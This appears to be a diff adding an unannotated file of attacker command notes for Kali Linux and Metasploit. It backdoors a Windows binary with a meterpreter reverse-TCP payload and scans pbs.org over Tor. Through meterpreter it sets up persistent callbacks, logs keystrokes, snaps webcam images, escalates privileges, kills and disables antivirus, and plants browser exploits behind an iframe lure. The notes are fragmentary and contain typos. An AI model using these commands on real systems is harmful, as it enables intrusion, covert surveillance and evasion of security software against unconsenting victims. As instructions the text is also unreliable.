@@ -1,0 +1,95 @@
+﻿apt-get update
+apt-get install shellter
+cd /usr/share/windows-binaries
+ls -l
+PE Target: sbd.exe
+Choose L for "listed". Then, select 1 for the "meterpreter_reverse_tcp" payload
+msfconsole
+exploit
+
+apt update
+apt install python3-pip
+pip3 install raccoon_scanner
+raccoon --tor-routing
+raccoon -t pbs.org --tor-relay
+cd
+cd Raccoon_scan_results
+ls
+ nano nmap_scan.txt
+ nano subdomains.txt.
+ tls_report.txt
+64-bit block cipher 3DES vulnerable to SWEET32 attack
+CVE-2016-2183
+web_scan
+
+wget http://updates.metasploit.com/data/releases/framework-4.0.0-linux-full.run
+wget http://updates.metasploit.com/data/releases/framework-4.0.0-linux-x64-full.run
+chmod +x framework-4.*-linux-full.run
+sudo ./framework-4.*-linux-full.run
+msfconsole
+sudo msfupdate
+
+meterpreter > run persistence -h
+meterpreter >run persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
+meterpreter > background
+msf exploit(ms08_067_netapi) > sessions –i
+meterpreter >ps
+meterpreter > migrate 912
+meterpreter> keyscan_start
+meterpreter> keyscan_dump
+
+msf > search adobe
+exploit/windows/browser/adobe_flash_pixel_bender_bof
+msf > use exploit/windows/browser/abobe_flash_pixel_bender_bof
+msf > info
+msf > show options
+msf > set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.147.129
+exploit
+webcam.rb
+hashdump.rb
+meterpreter > webcam_list
+meterpreter > webcam_snap
+meterpreter > run webcam -p /var/www
+
+meterpreter > run persistence -h
+meterpreter >run persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
+meterpreter > background
+meterpreter > reboot
+
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > run killav.rb
+killav
+taskkill
+execute –f cmd.exe –c –H
+interact n
+tasklist /SVC | find /I "avg"
+taskkill /F /IM "avg"
+sc queryex (service name)
+sc config (service name) start=disabled
+taskkill /F /IM "avg"*
+tasklist /SVC | find /I "avg"
+
+msf> search type:exploit platform:windows unsafe
+msf> use /exploit/windows/browser/i.e._unsafe_scripting
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> show options
+msf> set LHOST 192.168.1.100
+msf> exploit (ie_unsafe_scripting) > exploit
+(http://192.168.1.100:8080/HG6Kn71Nva )
+<iframe src="http://192.168.1.100:8080/HG6Kn71Nva "></iframe>
+inside the <body>
+
+kali > cd /usr/share/metasploit-framework/scripts/resource
+kali > ls -l
+kali > msfconsole
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/meterpreter/reverse_http
+msf > set LHOST 192.168.181.128
+msf > set LPORT 4444
+msf > makerc handler_http.rc
+msf > more handler_http.rc
+msf > resource handler_http.rc
+msf > exploit
+kali > msfconsole -r handler_http.rc
